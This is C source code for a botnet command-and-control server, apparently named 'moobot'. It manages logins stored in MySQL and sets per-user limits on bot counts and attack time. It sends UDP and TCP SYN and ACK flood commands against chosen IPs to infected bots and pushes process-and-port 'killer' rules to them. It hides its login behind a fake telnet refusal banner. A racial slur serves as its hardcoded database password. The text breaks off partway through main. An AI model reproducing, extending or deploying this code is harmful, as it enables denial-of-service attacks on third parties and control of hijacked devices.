#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <glob.h>
#include <signal.h>
#include <mysql.h>
#include <my_global.h>
#include <arpa/inet.h>
#include <sys/epoll.h>
#include <sys/types.h>
#include <sys/socket.h>

/* general configuration */
#define MAXFDS 1000000
#define MAXATTACKS 3
#define AUTH_TIMEOUT 10
#define EPOLL_TIMEOUT -1
#define PHI 0x9e3779b9

/* database configuration */
#define NAME "botnet"
#define SERVER "localhost"
#define USER "root"
#define PASSWORD "nigger12345!"

static volatile int epoll_fd = 0, listen_fd = 0, reflectors = 0, attacking = 1;
static uint32_t x, y, z, w;
MYSQL *database;

struct clientdata_t 
{
    uint32_t ip, authed_time;
    int fd, name_len;
    char connected, name[32];
    enum {
    	BOT,
    	ADMIN
    } type;
} clients[MAXFDS];

struct accountinfo_t
{
	int fd;
	int maxbots;
	int attacktime;
};

struct attackslots_t
{
	int sentat;
	int expiresat;
} attacks[MAXATTACKS];

void clearnup_connection(struct clientdata_t *conn)
{
	if (conn->fd > 3)
	{
		close(conn->fd);
		conn->fd = 0;
	}

	conn->type = BOT;
	memset(conn->name, 0, sizeof(conn->name));
	conn->name_len = 0;
	conn->ip = 0;
	conn->connected = 0;
}

void terminate(void)
{
	int i;
	for (i = 0; i < MAXFDS; i++)
		clearnup_connection(&clients[i]);

	mysql_close(database);
	perror(NULL);
}

int split(const char *txt, char delim, char ***tokens)
{
    int *tklen, *t, count = 1;
    char **arr, *p = (char *) txt;

    while (*p != '\0') 
    	if (*p++ == delim) 
    		count += 1;

    t = tklen = calloc (count, sizeof (int));
    for (p = (char *) txt; *p != '\0'; p++) 
    	*p == delim ? *t++ : (*t)++;

    *tokens = arr = malloc (count * sizeof (char *));
    t = tklen;
    p = *arr++ = calloc (*(t++) + 1, sizeof (char *));
    while (*txt != '\0')
    {
        if (*txt == delim)
        {
            p = *arr++ = calloc (*(t++) + 1, sizeof (char *));
            txt++;
        }
        else 
        	*p++ = *txt++;
    }
    free(tklen);
    return count;
}

int is_blacklisted(char *check)
{
	int i, found = 0;
	MYSQL_RES *res;
	MYSQL_ROW row;

	if (mysql_query(database, "select * from blacklisted") == 1)
		return found;
	else
	{
		res = mysql_use_result(database);
		while ((row = mysql_fetch_row(res)) != NULL)
		{
			if (strcmp(row[0], check) == 0)
			{
				found = 1;
				break;
			}
		}
	}

	mysql_free_result(res);
	return found;
}

void broadcast_command(char *name, char *sendbuf, int maxcount, int maxtime, int myfd)
{
#ifdef DEBUG
    printf("[broadcast] command sending to bots\n");
#endif

	int i, n, sentto, fd, argument_count, err = 0, edited = 0, tmp = 1, atktime, slot = -1;
	char rdbuf[1024];
    uint16_t len;
    struct sockaddr_in sockaddr = {0};
    char **arguments;
    argument_count = split(sendbuf, ' ', &arguments);

#ifdef DEBUG
    printf("[broadcast] parsing arguments\n");
#endif

    for (i = 0; i < argument_count; i++)
    {
    	if (i == 0 && sendbuf[0] == '-')
    	{	
    		int oldcount = maxcount;
    		maxcount = atoi(arguments[i] + 1);

    		if (maxcount > oldcount && oldcount != -1)
    		{
    			write(myfd, "\e[91mYou do not have access to this many bots!\n", strlen("\e[91mYou do not have access to this many bots!\n"));
    			err = 1;
    			break;
    		}
    		else
    		{
    			edited = 1;
    			sendbuf = sendbuf + strlen(arguments[i]) + 1;
    		}
    	}

    	if ((i == 1 && edited == 0) || (i == 2 && edited == 1))
    	{
    		if (is_blacklisted(arguments[i]) == 1)
    		{
    			write(myfd, "\e[91mThis host is blacklisted from attacks!\n", strlen("\e[91mThis host is blacklisted from attacks!\n"));
    			err = 1;
    			break;
    		}
    	}

    	if ((i == 2 && edited == 0) || (i == 3 && edited == 1) && maxtime != -1)
    	{
    		atktime = atoi(arguments[i]);

    		if (atktime > maxtime)
    		{
    			write(myfd, "\e[91mPlease stay within your attack duration limit!\n", strlen("\e[91mPlease stay within your attack duration limit!\n"));
    			err = 1;
    			break;
    		}
    	}
    }

    if (err == 1)
    	return;

    for (i = 0; i < argument_count; i++) 
    	free(arguments[i]);

    free(arguments);
	for (i = 0; i < MAXATTACKS; i++)
    {
    	if (time(NULL) > attacks[i].expiresat)
    	{
    		slot = i;
    		attacks[i].sentat = time(NULL);
    		attacks[i].expiresat = attacks[i].sentat + atktime;
    		break;
    	}
    }
    
    if (slot == -1)
    {
    	write(myfd, "\e[91mAll attack slots are currently full!\n", strlen("\e[91mAll attack slots are currently full!\n"));
    	return;
    }

    if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
        return;

    sockaddr.sin_family = AF_INET;
    sockaddr.sin_port = htons(123);
    sockaddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    if (connect(fd, (struct sockaddr *)&sockaddr, sizeof (struct sockaddr_in)) == -1)
    {
        close(fd);
        return;   
    }

    send(fd, sendbuf, strlen(sendbuf), 0);
    send(fd, "\n", 1, 0);

    n = recv(fd, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
    if (n == -1)
        return;
            
    if (len == 0)
        return;

    len = ntohs(len);
    if (len > sizeof (rdbuf))
    {
        close(fd);
        return;
    }

    n = recv(fd, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
    if (n == -1)
 		return;

    recv(fd, &len, sizeof (len), MSG_NOSIGNAL);
    len = ntohs(len);
    recv(fd, rdbuf, len, MSG_NOSIGNAL);

#ifdef DEBUG
    printf("[broadcast] encrypting bot traffic\n");
#endif
   
	for (i = 0; i < MAXFDS; i++)
	{
		if (clients[i].connected == 1 && clients[i].type != ADMIN)
		{
			if (sentto >= maxcount && maxcount != -1)
				break;

			if (attacking == 1)
			{
				send(clients[i].fd, rdbuf, len, MSG_NOSIGNAL);
				sentto++;
			}
		}
	}

	char sndbuf[128];
	sprintf(sndbuf, "\e[92mCommand sent to %d bots and is taking up slot %d\n", sentto, slot);
	write(myfd, sndbuf, strlen(sndbuf));
	sentto = 0;
	memset(sndbuf, 0, sizeof(sndbuf));
	memset(rdbuf, 0, sizeof(rdbuf));
}

void list_ports(int myfd)
{
	int i;
	MYSQL_RES *res;
	MYSQL_ROW row;

	if (mysql_query(database, "select * from ports") == 1)
		return;
	
	write(myfd, "\033[00mPorts currently being killed\n\n", strlen("\033[00mPorts currently being killed\n\n"));
	res = mysql_use_result(database);
	while ((row = mysql_fetch_row(res)) != NULL)
	{
		char sendbuf[32];
		sprintf(sendbuf, "\e[96m%s ", row[0]);
		send(myfd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
		memset(sendbuf, 0, sizeof(sendbuf));
	}

	write(myfd, "\r\n", 2);
	mysql_free_result(res);
}

void killer_task(void)
{
	int i;
	MYSQL_RES *res;
	MYSQL_ROW row;

	if (mysql_query(database, "select * from killer") == 1)
		return;
	else
	{
		res = mysql_use_result(database);
		while ((row = mysql_fetch_row(res)) != NULL)
		{
			for (i = 0; i < MAXFDS; i++)
			{
				if (clients[i].type != ADMIN)
				{
					char sendbuf[32];
					sprintf(sendbuf, "\x08\x75\x12\x89\x95\x45\x76%s %s", row[0], row[1]);
					send(clients[i].fd, sendbuf, 13 + strlen(row[0]) + strlen(row[1]), MSG_NOSIGNAL);
					memset(sendbuf, 0, sizeof(sendbuf));
				}
			}
		}
	}

	mysql_free_result(res);
}

void bot_task(void)
{
	int i;
	MYSQL_RES *res;
	MYSQL_ROW row;

	if (mysql_query(database, "select * from ports") == 1)
		return;
	else
	{
		res = mysql_use_result(database);
		while ((row = mysql_fetch_row(res)) != NULL)
		{
			for (i = 0; i < MAXFDS; i++)
			{
				if (clients[i].type != ADMIN)
				{
					char sendbuf[32];
					sprintf(sendbuf, "\x34\x21\x35\x75\x34\x12\x38%s", row[0]);
					send(clients[i].fd, sendbuf, 8 + strlen(row[0]), MSG_NOSIGNAL);
					memset(sendbuf, 0, sizeof(sendbuf));
				}
			}
		}
	}

	mysql_free_result(res);
}

void ping_pong(void)
{
	int i;

	for (i = 0; i < MAXFDS; i++)
	{
		if (clients[i].type != ADMIN)
			send(clients[i].fd, "\x00\x00\x00\x00\x00\n", 6, MSG_NOSIGNAL);
	}
}

void stats(int myfd)
{
	int i = 0, q = 0, got = 0;
	
	struct bot_data {
		char name[32];
		int count;
	} data[10];
	memset(data, 0, sizeof(data));

	for (i = 0; i < MAXFDS; i++)
	{
		int mynum = i;

		if (clients[i].name_len >= 1)
		{
			for (q = 0; q < 10; q++)
			{
				if (strcmp(clients[mynum].name, data[q].name) == 0)
				{
					data[q].count++;
					break;
				}
				else
				{
					strcpy(data[got].name, clients[mynum].name);
					data[got].count++;
					got++;
					break;
				}
				break;
			}

			mynum = 0;
		}
	}

	for (i = 0; i < 10; i++)
	{
		if (data[i].count >= 1)
		{
			char rdbuf[64];
			sprintf(rdbuf, "\e[96m%s: %d\r\n", data[i].name, data[i].count);
			write(myfd, rdbuf, strlen(rdbuf));
			memset(rdbuf, 0, sizeof(rdbuf));
		}
	}
	
	memset(data, 0, sizeof(data));
}

void *tab_title(void *arg)
{
	int botcount = 0, i;
	char title[128];
	struct accountinfo_t *accinfo;
	accinfo = (struct accountinfo_t *)arg;

	while (1)
	{
		for (i = 0; i < MAXFDS; i++)
		{
			if (clients[i].connected == 1 && clients[i].type != ADMIN)
				botcount++;
			else
				continue;
		}

		if (botcount >= accinfo->maxbots && accinfo->maxbots != -1)
			sprintf(title, "\033]0;%d Loaded\007", accinfo->maxbots);
		else
			sprintf(title, "\033]0;%d Loaded\007", botcount);

		write(accinfo->fd, title, strlen(title));
		botcount = 0;
		sleep(2);
	}

	pthread_exit(0);
}

int fdgets(unsigned char *buffer, int bufferSize, int fd) 
{
	int total = 0, got = 1;

	while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') 
	{ 
		got = read(fd, buffer + total, 1); 
		total++; 
	}

	return got;
}

void trim(char *str) 
{
	int i, begin = 0, end = strlen(str) - 1;

    while (isspace(str[begin])) 
    	begin++;

    while ((end >= begin) && isspace(str[end])) 
    	end--;

    for (i = begin; i <= end; i++) 
    	str[i - begin] = str[i];

    str[i - begin] = '\0';
}

int fd_set_blocking(int fd, int blocking) 
{
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags == -1)
        return 0;

    if (blocking)
        flags &= ~O_NONBLOCK;
    else
        flags |= O_NONBLOCK;

    return fcntl(fd, F_SETFL, flags) != -1;
}

int create_and_bind(char *port) 
{
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;

	memset(&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo(NULL, port, &hints, &result);

    if (s != 0)
		return -1;

	for (rp = result; rp != NULL; rp = rp->ai_next) 
	{
		sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) 
			continue;

		int yes = 1;
		if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) 
			terminate();

		s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0)
			break;

		close(sfd);
	}

	if (rp == NULL)
		return -1;
	else
	{
		freeaddrinfo(result);
		return sfd;
	}
}

void *bot_event(void *arg) 
{
	struct epoll_event event;
	struct epoll_event *events;

    events = calloc(MAXFDS, sizeof event);

    while (1) 
    {
		int n, i;
		n = epoll_wait(epoll_fd, events, MAXFDS, EPOLL_TIMEOUT);

		for (i = 0; i < n; i++) 
		{
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) 
			{
				printf("[Cnc] Client disconnected %s (Reason: Lost Connection)\n", inet_ntoa(*(struct in_addr *)&(clients[events[i].data.fd].ip)));
				clearnup_connection(&clients[events[i].data.fd]);
				continue;
			}
			else if (listen_fd == events[i].data.fd) 
			{
               	while (1) 
               	{
               		int accept_fd, s;
               		uint32_t packet = htonl(11811);
					struct sockaddr in_addr;
	                socklen_t in_len = sizeof(in_addr);

					if ((accept_fd = accept(listen_fd, &in_addr, &in_len)) == -1) 
					{
						if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) 
							break;
                    	else
                    		terminate();
					}

					if ((s = fd_set_blocking(accept_fd, 0)) == -1) 
					{ 
						close(accept_fd); 
						break; 
					}

					event.data.fd = accept_fd;
					event.events = EPOLLIN | EPOLLET;
					
					if ((s = epoll_ctl(epoll_fd, EPOLL_CTL_ADD, accept_fd, &event)) == -1) 
					{
						terminate();
						break;
					}

					clients[event.data.fd].connected = 1;
					clients[event.data.fd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
					clients[event.data.fd].fd = event.data.fd;
					clients[event.data.fd].authed_time = time(NULL);
					send(clients[event.data.fd].fd, "\x00\x00\x00\x00\x00\n", 6, MSG_NOSIGNAL);
				}
				continue;
			}
			else 
			{
				int end = 0, fd = events[i].data.fd;

				while (1) 
				{
					char buf[128];
					ssize_t count;
					
					while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, clients[fd].fd)) > 0 && clients[fd].type != ADMIN) 
					{
	
					}

					if (count == -1)
					{
						if (errno != EAGAIN) 
							end = 1;

						break;
					}
					else if (count == 0)
					{
						end = 1;
						break;
					}

					if (end == 1)
					{
						clearnup_connection(&clients[fd]);
					}
				}
			}
		}
	}
}

void *controller_thread(void *arg)
{
	char rdbuf[1024], username[32], password[32], query[1024], prompt[256];
	int myfd = *((int *)arg), i = 0;
	ssize_t buflen;
	pthread_t thread;

	struct {
		int admin;
		int maxbots;
		int attacktime;
	} controller;

	MYSQL_RES *res;
	MYSQL_ROW row;

	write(myfd, "\033[?1049h\r\n\r\n", strlen("\033[?1049h") + 4);
	write(myfd, "Trying 185.123.24.92...\r\ntelnet: Unable to connect to remote host: Connection refused\n", 86);
	read(myfd, password, sizeof(password));
	trim(password); password[strcspn(password, "\n")] = 0;

	if (strcmp(password, ".ok") != 0)
		pthread_exit(0);

	memset(password, 0, sizeof(password));
	write(myfd, "\033[?1049h\r\n\r\n", strlen("\033[?1049h") + 4);
	write(myfd, "\e[5mPlease input correct user credentials\e[25m\r\n\r\n", strlen("\e[5mPlease input correct user credentials\e[25m\r\n\r\n"));
	write(myfd, "\e[34mUsername\033[00m:\e[8m\e[4m ", strlen("\e[34mUsername\033[00m:\e[8m\e[4m "));
	read(myfd, username, sizeof(username));
	sprintf(rdbuf, "\r\033[00m\e[34mPassword\033[00m:\e[8m\e[4m ");
	write(myfd, rdbuf, strlen(rdbuf));
	memset(rdbuf, 0, sizeof(rdbuf));
	read(myfd, password, sizeof(password));

	write(myfd, "\r\n\e[28m\e[24mValadating account info\r", strlen("\r\n\e[28m\e[24mValadating account info\r"));
	sleep(2);

	trim(username); username[strcspn(username, "\n")] = 0;
	trim(password); password[strcspn(password, "\n")] = 0;

	sprintf(query, "select password from logins where username='%s'", username);

	if (mysql_query(database, query) == 1)
	{
		memset(username, 0, sizeof(username));
		memset(password, 0, sizeof(password));
		pthread_exit(0);
	}
	else
	{
		memset(query, 0, sizeof(query));
		res = mysql_use_result(database);
		if ((row = mysql_fetch_row(res)) == NULL)
		{
			memset(username, 0, sizeof(username));
			memset(password, 0, sizeof(password));
			mysql_free_result(res);
			pthread_exit(0);
		}
	}

	if (strcmp(password, row[0]) != 0)
	{
		memset(username, 0, sizeof(username));
		memset(password, 0, sizeof(password));
		mysql_free_result(res);
		pthread_exit(0);
	}
	memset(query, 0, sizeof(query));
	mysql_free_result(res);

	sprintf(query, "select admin from logins where username='%s'", username);
	if (mysql_query(database, query) == 1)
		pthread_exit(0);
	else
	{
		memset(query, 0, sizeof(query));
		res = mysql_use_result(database);
		if ((row = mysql_fetch_row(res)) == NULL)
		{
			mysql_free_result(res);
			pthread_exit(0);
		}
	}

	controller.admin = atoi(row[0]);
	if (controller.admin != 0 && controller.admin != 1)
	{
		memset(query, 0, sizeof(query));
		mysql_free_result(res);
		pthread_exit(0);
	}
	memset(query, 0, sizeof(query));
	mysql_free_result(res);

	sprintf(query, "select time from logins where username='%s'", username);
	if (mysql_query(database, query) == 1)
		pthread_exit(0);
	else
	{
		memset(query, 0, sizeof(query));
		res = mysql_use_result(database);
		if ((row = mysql_fetch_row(res)) == NULL)
		{
			mysql_free_result(res);
			pthread_exit(0);
		}
	}

	controller.attacktime = atoi(row[0]);
	if (controller.attacktime >= 86400)
	{
		memset(query, 0, sizeof(query));
		mysql_free_result(res);
		pthread_exit(0);
	}
	memset(query, 0, sizeof(query));
	mysql_free_result(res);

	sprintf(query, "select botcount from logins where username='%s'", username);
	if (mysql_query(database, query) == 1)
		pthread_exit(0);
	else
	{
		memset(query, 0, sizeof(query));
		res = mysql_use_result(database);
		if ((row = mysql_fetch_row(res)) == NULL)
		{
			mysql_free_result(res);
			pthread_exit(0);
		}
	}

	controller.maxbots = atoi(row[0]);
	if (controller.maxbots != -1 && !controller.maxbots > 1)
	{
		memset(query, 0, sizeof(query));
		mysql_free_result(res);
		pthread_exit(0);
	}
	memset(query, 0, sizeof(query));
	mysql_free_result(res);

	write(myfd, "\033[?1049h\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", strlen("\033[?1049h") + 16);

	if (controller.admin == 1)
		sprintf(prompt, "\e[34m%s\e[96m@\e[34mmoobot\033[00m:\e[96m~/admin/\033[00m$ ", username);
	else
		sprintf(prompt, "\e[34m%s\e[96m@\e[34mmoobot\033[00m:\e[96m~\033[00m$ ", username);

	write(myfd, prompt, strlen(prompt));

	struct accountinfo_t *accinfo;
	accinfo = (struct accountinfo_t *)malloc(sizeof(struct accountinfo_t *));
	accinfo->maxbots = controller.maxbots;
	accinfo->attacktime = controller.attacktime;
	accinfo->fd = myfd;
	pthread_create(&thread, NULL, &tab_title, (void *)accinfo);

	while (read(myfd, rdbuf, sizeof(rdbuf)) > 0) 
	{
		trim(rdbuf);
									
		if (strlen(rdbuf) == 0)
		{
			write(myfd, prompt, strlen(prompt));
			memset(rdbuf, 0, sizeof(rdbuf));
			continue;
		}

		if (strcmp(rdbuf, "help") == 0 || rdbuf[0] == '?')
		{
			write(myfd, "\033[00mlayer4 floods\n", strlen("\033[00mlayer4 floods\n"));
			write(myfd, "\e[96m!udp <ip> <time>\t\033[00m| \e[34mbasic udp flood\n", strlen("\e[96m!udp <ip> <time>\t\033[00m| \e[34mbasic udp flood\n"));
			write(myfd, "\e[96m!udpraw <ip> <time>\t\033[00m| \e[34mudp flood with more pps\n", strlen("\e[96m!udpraw <ip> <time>\t\033[00m| \e[34mudp flood with more pps\n"));
			write(myfd, "\e[96m!tcpsyn <ip> <time>\t\033[00m| \e[34mtcp syn flood with more options\n", strlen("\e[96m!tcpsyn <ip> <time>\t\033[00m| \e[34mtcp syn flood with more options\n"));
			write(myfd, "\e[96m!tcpack <ip> <time>\t\033[00m| \e[34mtcp ack flood with options\n", strlen("\e[96m!tcpack <ip> <time>\t\033[00m| \e[34mtcp ack flood with options\n"));

			if (controller.admin == 1)
			{
				write(myfd, "\033[00mbot controll\n", strlen("\033[00mbot controll\n"));
				write(myfd, "\e[96mkiller <add/rm/force>\t\033[00m| \e[34madd bot killer configuration rule\n", strlen("\e[96mkiller <add/rm/force>\t\033[00m| \e[34madd bot killer configuration rule\n"));
				write(myfd, "\e[96mport <add/rm/force>\t\033[00m| \e[34mno argument will list current ports to kill\n", strlen("\e[96mport <add/rm/force>\t\033[00m| \e[34mno argument will list current ports to kill\n"));
			
				write(myfd, "\033[00madmin commands\n", strlen("\n\033[00madmin commands\n"));
				write(myfd, "\e[96madduser\t\t\t\033[00m| \e[34mcreate a new user without admin privlages\n", strlen("\e[96madduser\t\t\t\033[00m| \e[34mcreate a new user without admin privlages\n"));
				write(myfd, "\e[96mdeluser\t\t\t\033[00m| \e[34mremove a user\n", strlen("\e[96mdeluser\t\t\t\033[00m| \e[34mremove a user\n"));
				write(myfd, "\e[96mblacklist <add/remove>\t\033[00m| \e[34mblacklist an ip from being attacked\n", strlen("\e[96mblacklist <add/remove>\t\033[00m| \e[34mblacklist an ip from being attacked\n"));
				write(myfd, "\e[96mattacks <on/off>\t\033[00m| \e[34menable/disable attack broadcasts\n", strlen("\e[96mattacks <on/off>\t\033[00m| \e[34menable/disable attack broadcasts\n"));
			}
		}
		else if ((strcmp(rdbuf, "killer add") == 0) && controller.admin == 1)
		{
			char searchfile[32], searchbuf[32];

			write(myfd, "\e[96mFile to search (/proc/pid/file)\033[00m: ", strlen("\e[96mFile to search (/proc/pid/file)\033[00m: "));
			read(myfd, searchfile, sizeof(searchfile));
			write(myfd, "\e[96mBuf to find\033[00m: ", strlen("\e[96mBuf to find\033[00m: "));
			read(myfd, searchbuf, sizeof(searchbuf));

			trim(searchfile); searchfile[strcspn(searchfile, "\n")] = 0;
			trim(searchbuf); searchbuf[strcspn(searchbuf, "\n")] = 0;

			sprintf(query, "INSERT INTO killer VALUES ('%s', '%s');", searchfile, searchbuf);

			if (mysql_query(database, query) == 1)
				write(myfd, "\e[91mFailed to add killer rule to database, do it manuly\n", strlen("\e[91mFailed to add killer rule to database, do it manuly\n"));
			else
				write(myfd, "\e[92mKiller rule has been saved in database\n", strlen("\e[92mKiller rule has been saved in database\n"));

			memset(searchfile, 0, sizeof(searchfile));
			memset(searchbuf, 0, sizeof(searchbuf));
		}
		else if ((strcmp(rdbuf, "killer rm") == 0) && controller.admin == 1)
		{
			char searchfile[32];

			write(myfd, "\e[96mFile to remove (/proc/pid/file)\033[00m: ", strlen("\e[96mFile to remove (/proc/pid/file)\033[00m: "));
			read(myfd, searchfile, sizeof(searchfile));

			trim(searchfile); username[strcspn(searchfile, "\n")] = 0;
			sprintf(query, "DELETE FROM `killer` WHERE file=\"%s\";", searchfile);

			if (mysql_query(database, query) == 1)
				write(myfd, "\e[91mFailed to remove killer rule from database, do it manuly\n", strlen("\e[91mFailed remove add killer rule from database, do it manuly\n"));
			else
				write(myfd, "\e[92mRemoved all killer rules attatched to file\n", strlen("\e[92mRemoved all killer rules attatched to file\n"));

			memset(searchfile, 0, sizeof(searchfile));
		}
		else if ((strcmp(rdbuf, "killer force") == 0) && controller.admin == 1)
		{
			killer_task();
		}
		else if ((strcmp(rdbuf, "port") == 0) && controller.admin == 1)
		{
			list_ports(myfd);
		}
		else if ((strcmp(rdbuf, "port force") == 0) && controller.admin == 1)
		{
			bot_task();
		}
		else if ((strcmp(rdbuf, "port add") == 0) && controller.admin == 1)
		{
			char newport[8];

			write(myfd, "\e[96mPort to be killed\033[00m: ", strlen("\e[96mPort to be killed\033[00m: "));
			read(myfd, newport, sizeof(newport));

			trim(newport); newport[strcspn(newport, "\n")] = 0;
			sprintf(query, "INSERT INTO ports VALUES ('%s');", newport);

			if (mysql_query(database, query) == 1)
				write(myfd, "\e[91mFailed to add port to database, do it manuly\n", strlen("\e[91mFailed to add port to database, do it manuly\n"));
			else
				write(myfd, "\e[92mPort added to list\n", strlen("\e[92mPort added to list\n"));

			memset(newport, 0, sizeof(newport));
		}
		else if ((strcmp(rdbuf, "port rm") == 0) && controller.admin == 1)
		{
			char newport[8];

			write(myfd, "\e[96mPort to be removed\033[00m: ", strlen("\e[96mPort to be removed\033[00m: "));
			read(myfd, newport, sizeof(newport));

			trim(newport); newport[strcspn(newport, "\n")] = 0;
			sprintf(query, "DELETE FROM `ports` WHERE port=\"%s\";", newport);

			if (mysql_query(database, query) == 1)
				write(myfd, "\e[91mFailed to removed port from database, do it manuly\n", strlen("\e[91mFailed to add port to database, do it manuly\n"));
			else
				write(myfd, "\e[92mPort removed from list\n", strlen("\e[92mPort removed from list\n"));

			memset(newport, 0, sizeof(newport));
		}
		else if ((strcmp(rdbuf, "blacklist") == 0) && controller.admin == 1)
		{
			char blockhost[32];

			write(myfd, "\e[96mHost to blacklist (ipv4)\033[00m: ", strlen("\e[96mHost to blacklist (ipv4)\033[00m: "));
			read(myfd, blockhost, sizeof(blockhost));

			trim(blockhost); blockhost[strcspn(blockhost, "\n")] = 0;
			sprintf(query, "INSERT INTO blacklisted VALUES ('%s');", blockhost);

			if (mysql_query(database, query) == 1)
				write(myfd, "\e[91mFailed to blacklist host, do it manuly\n", strlen("\e[91mFailed to blacklist host, do it manuly\n"));
			else
				write(myfd, "\e[92mHost added to blacklist\n", strlen("\e[92mHost added to blacklist\n"));

			memset(blockhost, 0, sizeof(blockhost));
		}
		else if ((strcmp(rdbuf, "adduser") == 0 || strcmp(rdbuf, "newuser") == 0) && controller.admin == 1)
		{
			char newuser[32], newpass[32], botcount[32], attackduration[32];

			write(myfd, "\e[96mUsername of new user\033[00m: ", strlen("\e[96mUsername of new user\033[00m: "));
			read(myfd, newuser, sizeof(newuser));
			write(myfd, "\e[96mPassword of new user\033[00m: ", strlen("\e[96mPassword of new user\033[00m: "));
			read(myfd, newpass, sizeof(newpass));
			write(myfd, "\e[96mBotcount of new user (-1 = unlimited)\033[00m: ", strlen("\e[96mBotcount of new user (-1 = unlimited)\033[00m: "));
			read(myfd, botcount, sizeof(botcount));
			write(myfd, "\e[96mAttack duration of new user (-1 = unlimited)\033[00m: ", strlen("\e[96mAttack duration of new user (-1 = unlimited)\033[00m: "));
			read(myfd, attackduration, sizeof(attackduration));

			trim(newuser); username[strcspn(newuser, "\n")] = 0;
			trim(newpass); username[strcspn(newpass, "\n")] = 0;
			trim(botcount); username[strcspn(botcount, "\n")] = 0;
			trim(attackduration); username[strcspn(attackduration, "\n")] = 0;

			sprintf(query, "INSERT INTO logins VALUES ('%s', '%s', '%s', '%s', '0');", newuser, newpass, attackduration, botcount);

			if (mysql_query(database, query) == 1)
				write(myfd, "\e[91mFailed to add user to database\n", strlen("\e[91mFailed to add user to database\n"));
			else
				write(myfd, "\e[92mNew user added to database\n", strlen("\e[92mNew user added to database\n"));

			memset(newuser, 0, sizeof(newuser));
			memset(newpass, 0, sizeof(newpass));
			memset(botcount, 0, sizeof(botcount));
		}
		else if ((strcmp(rdbuf, "deluser") == 0 || strcmp(rdbuf, "rmuser") == 0) && controller.admin == 1)
		{
			char deluser[32];

			write(myfd, "\e[96mUsername of new user\033[00m: ", strlen("\e[96mUsername of new user\033[00m: "));
			read(myfd, deluser, sizeof(deluser));

			trim(deluser); deluser[strcspn(deluser, "\n")] = 0;

			sprintf(query, "DELETE FROM `logins` WHERE username=\"%s\";", deluser);

			if (mysql_query(database, query) == 1)
				write(myfd, "\e[91mFailed to remove access from user, do it manuly\n", strlen("\e[91mFailed to remove access from user, do it manuly\n"));
			else
				write(myfd, "\e[92mThis users access has been removed\n", strlen("\e[92mThis users access has been removed\n"));

			memset(deluser, 0, sizeof(deluser));
		}
		else if ((strcmp(rdbuf, "attacks on") == 0) && controller.admin == 1)
		{
			write(myfd, "\e[92mBots will now accept attack requests\n", strlen("\e[92mBots will now accept attack requests\n"));
			attacking = 1;
		}
		else if ((strcmp(rdbuf, "attacks off") == 0) && controller.admin == 1)
		{
			write(myfd, "\e[91mBots will no longer receive attack requests\n", strlen("\e[91mBots will no longer receive attack requests\n"));
			attacking = 0;
		}
		else if ((strcmp(rdbuf, "bots") == 0 || strcmp(rdbuf, "stats") == 0 || strcmp(rdbuf, "botcount") == 0) && controller.admin == 1)
			stats(myfd);
		else if (rdbuf[0] == '!')
			broadcast_command(username, rdbuf + 1, controller.maxbots, controller.attacktime, myfd);

		write(myfd, prompt, strlen(prompt));
		memset(rdbuf, 0, sizeof(rdbuf));
	}

	memset(query, 0, sizeof(query));
	memset(username, 0, sizeof(username));
	memset(password, 0, sizeof(password));
	pthread_exit(0);
}

void *bot_task_thread(void *arg)
{
	int myfd = *((int *)arg);
	
    while (1) 
    {
    	bot_task();
		sleep(300);
    }

	pthread_exit(0);
}

void *ping_pong_thread(void *arg)
{
	int myfd = *((int *)arg);
	
    while (1) 
    {
    	ping_pong();
		sleep(5);
    }

	pthread_exit(0);
}

void *controller_listen(void *arg)
{
	int myfd = *((int *)arg), newfd;
	struct sockaddr in_addr;
	socklen_t in_len = sizeof(in_addr);

	if (listen(myfd, SOMAXCONN) == -1)
		pthread_exit(0);

	while (1)
	{
		if ((newfd = accept(myfd, &in_addr, &in_len)) == -1) 
			break;

		pthread_t cthread;
		pthread_create(&cthread, NULL, &controller_thread, &newfd);
	}
		
	close(myfd);
	pthread_exit(0);
}

int main(int argc, char *argv[], void *sock)
{
	int s, threads;
    struct epoll_event event;

    if (argc != 4) 
    {
    	printf("[Main] Usage: ./cnc <bot-port> <cnc-port> <threads>\n");
		exit(EXIT_FAILURE);
    }
    else
    {
    	threads = atoi(argv[3]);
    	if (threads < 10 || threads > 750)
    	{
	    	printf("[Main] You are using to much or to little threads 10-750 is the limit\n");
	    	terminate();
    	}
    }

    for (s = 0; s < MAXATTACKS; s++)
    {
    	attacks[s].sentat = time(NULL) + 1;
    	attacks[s].expiresat = time(NULL) + 2;
    }

    database = mysql_init(NULL);
    if (!mysql_real_connect(database, SERVER, USER, PASSWORD, NAME, 0, NULL, 0)) 
    {
    	printf("[Main] Failed to open the database\n");
    	terminate();
    }

    if ((listen_fd = create_and_bind(argv[1])) == -1) 
    {
    	printf("[Main] Failed to bind bot worker\n");
    	terminate();
    }

    if ((s = fd_set_blocking(listen_fd, 0)) == -1) 
    {
    	printf("[Main] Failed to set socket to non-blocking\n");
    	terminate();
    }

    if ((s = listen(listen_fd, SOMAXCONN)) == -1) 
    {
    	printf("[Main] Failed to listen\n");
		terminate();
    }

    if ((epoll_fd = epoll_create1(0)) == -1) 
    {
    	printf("[Main] Failed to epoll create\n");
		terminate();
    }

    event.data.fd = listen_fd;
    event.events = EPOLLIN | EPOLLET;
    
